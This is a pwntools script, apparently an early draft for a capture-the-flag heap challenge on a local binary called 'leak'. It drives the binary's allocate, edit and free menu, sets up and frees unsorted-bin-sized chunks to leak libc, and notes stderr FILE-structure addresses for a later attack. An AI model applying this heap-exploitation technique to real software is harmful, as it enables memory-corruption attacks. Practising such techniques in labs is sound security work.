from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
p=process('./leak')
elf=ELF('./leak')
def allocate(index,size):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
def free(index):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
p.recvuntil(b'set up.\n')
# p.recv()
pause()
# for i in range(7):
#     allocate(i,240)

allocate(7,1040)
allocate(8,16)
allocate(9,1040)
allocate(10,16)
# for i in range(7):
#     free(i)
free(7)
free(9)
p.interactive()

    
# 0x7f4be6fec680 <_IO_2_1_stderr_>:  
# 0x7fb09bfec680 <_IO_2_1_stderr_>:  
# 0x7f34fe3ec680 <_IO_2_1_stderr_>:    